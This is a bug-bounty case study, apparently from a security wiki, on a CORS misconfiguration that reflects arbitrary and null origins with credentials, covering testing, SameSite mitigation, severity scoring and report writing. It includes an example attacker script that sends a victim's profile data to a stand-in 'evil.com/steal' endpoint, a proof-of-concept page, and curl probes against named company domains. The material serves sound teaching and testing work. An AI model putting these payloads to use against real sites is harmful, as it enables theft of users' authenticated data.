# CS-06: CORS Misconfiguration — Origin Reflection + Null Origin

← [[Case-Studies-Overview]]

**Vuln class:** CORS Misconfiguration  
**Severity:** P4 / CVSS 3.7 LOW  
**Program:** Large consumer electronics company (HackerOne)  
**The lesson:** Understanding exactly why CORS is or isn't exploitable — and writing a report that explains the nuance correctly

---

## TL;DR

Four authentication domains for a major consumer electronics company reflected any arbitrary `Origin` header in `Access-Control-Allow-Origin` while also setting `Access-Control-Allow-Credentials: true`. This is a CORS misconfiguration. But — it was currently mitigated by modern browser `SameSite=Lax` defaults, which prevent the auth cookies from being sent cross-origin. The report correctly stated both the misconfiguration AND the mitigating factor, landing at CVSS 3.7 LOW because active exploitation required specific conditions (older browser or `SameSite=None` cookies).

A correctly scoped, nuanced report on a Low-severity finding is still a valid report.

---

## Background: CORS + Credentials (The Quick Version)

CORS (Cross-Origin Resource Sharing) is a browser security mechanism. By default, a script on `evil.com` cannot read responses from `bank.com` due to the Same-Origin Policy.

CORS allows a server to say: "I trust requests from `good-frontend.com` — let those through."

**The dangerous combination:**
```
Access-Control-Allow-Origin: https://evil.com    ← reflected from the request
Access-Control-Allow-Credentials: true           ← allows cookies to be sent
```

When both headers are present:
1. The victim's browser sends their auth cookies with the cross-origin request
2. The server processes the request as the authenticated victim
3. The server tells the browser it's okay for `evil.com` to read the response
4. `evil.com`'s JavaScript can read the victim's authenticated response

**The attack:**
```html
<!-- Attacker's page at evil.com -->
<script>
fetch('https://target.com/api/user/profile', { credentials: 'include' })
  .then(r => r.json())
  .then(data => {
    // Send the victim's data to attacker's server
    fetch('https://evil.com/steal?data=' + JSON.stringify(data));
  });
</script>
```

---

## What Was Found

**Step 1: Test for origin reflection**

```bash
# Send an arbitrary Origin header and check the CORS headers in the response
curl -sI https://id.target.com/api/user/v1/basic-info \
  -H "Origin: https://attacker.com" | grep -i "access-control"

# Response:
# Access-Control-Allow-Origin: https://attacker.com  ← reflected!
# Access-Control-Allow-Credentials: true
# Access-Control-Allow-Methods: POST,PUT,GET,OPTIONS,DELETE
# Access-Control-Max-Age: 3600
```

The server echoes back whatever `Origin` you send. This is the misconfiguration — a correct implementation would:
1. Check if the origin is in an allowlist
2. If yes: respond with that specific origin in `Access-Control-Allow-Origin`
3. If no: omit the `Access-Control-Allow-Origin` header entirely

**Step 2: Test the `null` origin (sandboxed iframe bypass)**

```bash
curl -sI https://id.target.com/api/user/v1/basic-info \
  -H "Origin: null" | grep -i "access-control"

# Access-Control-Allow-Origin: null  ← null is also reflected
# Access-Control-Allow-Credentials: true
```

The `null` origin reflection is separately dangerous. Sandboxed iframes (`<iframe sandbox="allow-scripts">`) and `data:` URIs send `Origin: null`. This means:
- If any XSS exists on any of the company's domains
- An attacker can embed a sandboxed iframe
- The iframe sends `Origin: null` → server reflects it → CORS bypass works

**Step 3: Confirm the misconfiguration affects multiple domains**

Same test against:
- `id.target.com` ← reflected
- `id.heytap.com` ← reflected (related company domain)
- `community.target.com` ← reflected
- `communityin.target.com` ← reflected

**Step 4: Compare with a correctly implemented endpoint**

```bash
curl -sI https://api.target.com/ \
  -H "Origin: https://attacker.com" | grep -i "access-control"

# Response body: "origin not allow."
# No Access-Control-Allow-Origin header set
```

A correctly implemented endpoint exists on the same company's infrastructure. This confirms the four affected domains are misconfigured, not that CORS reflection is intentional.

**Step 5: Build the PoC HTML**

```html
<html>
<body>
<script>
fetch('https://id.target.com/api/user/v1/basic-info', {
  credentials: 'include'  // send the victim's cookies
}).then(r => r.text()).then(data => {
  // If SameSite=None cookies exist, this response is the victim's auth data
  document.body.innerHTML = data;
  // In real attack: exfiltrate to attacker's server
});
</script>
</body>
</html>
```

---

## The Critical Nuance: SameSite Mitigation

Here's where this report differs from a naive CORS misconfiguration submission:

**Modern browsers default to `SameSite=Lax` for cookies that don't explicitly set a SameSite attribute.**

`SameSite=Lax` means the cookie is only sent cross-origin on top-level GET navigations (not `fetch()` or `XMLHttpRequest`). So even though the CORS headers are wrong, the browser won't send the auth cookies in a `fetch()` call from `evil.com` unless the cookies have `SameSite=None; Secure` set.

**When active exploitation WOULD work:**
1. Older browsers (pre-2020) without SameSite enforcement
2. If any auth cookies are explicitly set with `SameSite=None` (common for cross-domain SSO)
3. Via sandboxed iframes where `Origin: null` is sent — SameSite=Lax doesn't protect here

**The additional context that elevated the report:**

The company's global config file (`/conf/globalConfig.js`) was publicly readable and showed that a single auth infrastructure served many different domains:

```
Cookie domain scope: .target.com .heytap.com .realme.com .oneplus.com .coloros.com ...
```

Cross-domain SSO between these different registrable domains (they're not subdomains of each other) **requires** `SameSite=None; Secure` cookies at some point in the auth flow. The moment those cookies exist, the CORS misconfiguration becomes fully exploitable across all four affected domains.

---

## Why the Severity Is P4 (Low) and Not Higher

**What CVSS 3.7 means:**
```
AV:N  - Network accessible
AC:H  - High complexity (requires specific conditions)
PR:N  - No privileges
UI:R  - Requires victim interaction (must visit attacker's page)
S:U   - Unscoped
C:L   - Limited confidentiality impact (conditional on cookie type)
I:N   - No integrity impact
A:N   - No availability impact
```

The `AC:H` (High complexity) reflects the mitigating conditions: active exploitation requires either an older browser or `SameSite=None` cookies. If those conditions were confirmed present, this would be P2–P3.

**VRT rating:** `Server Security Misconfiguration → CORS Misconfiguration → Arbitrary Origin Trusted with Credentials` → **Varies** (P3 if exploitable, P5 if not)

---

## What Makes a Good CORS Report

Weak CORS reports say: "The server reflects arbitrary origins with credentials, severity: P2." They get triaged down or rejected because they don't account for SameSite.

A good CORS report:
1. **Shows the exact response headers** (curl output)
2. **Tests multiple endpoints** — is it one path or the whole domain?
3. **Tests `null` origin** — often more exploitable than arbitrary origin
4. **Checks for a correct implementation** elsewhere — proves it's an oversight
5. **Addresses SameSite** — is exploitation currently blocked? Under what conditions does it become exploitable?
6. **Checks cookie attributes** — `curl -I` the login response and examine `Set-Cookie` headers for `SameSite` values
7. **Provides a working PoC HTML** — shows you actually tested it

---

## Quick Checklist: CORS Testing

```bash
# 1. Test origin reflection
curl -sI https://target.com/api/endpoint \
  -H "Origin: https://attacker.com" | grep -i access-control

# 2. Test null origin
curl -sI https://target.com/api/endpoint \
  -H "Origin: null" | grep -i access-control

# 3. Test trusted-domain subdomain variant
curl -sI https://target.com/api/endpoint \
  -H "Origin: https://evil.target.com" | grep -i access-control

# 4. Check cookie attributes (during/after login)
curl -sI https://target.com/login | grep -i "set-cookie"
# Look for: SameSite=None; Secure (exploitable) vs SameSite=Lax/Strict (mitigated)

# 5. Find a correctly implemented endpoint for comparison
# Check other subdomains of the same target
```

---

## The `null` Origin: Underrated Attack Vector

Most CORS testing guides focus on arbitrary origin reflection. The `null` origin bypass is less discussed but important:

Any of these generate `Origin: null` in the browser:
- `<iframe sandbox="allow-scripts allow-forms">` content
- `data:` URI navigations
- `file://` page loads
- Cross-origin redirects (in some configurations)

If a target reflects `null` and you find XSS anywhere on their domain, you can chain it:
```
XSS on any subdomain → sandboxed iframe → null origin → CORS bypass → auth data exfiltration
```

---

*Related: [[CORS]] | [[Same-Origin-Policy]] | [[A05-Security-Misconfiguration]] | [[Case-Studies-Overview]]*

*Sources: Real HackerOne submission, OWASP Testing Guide OTG-CLIENT-007*
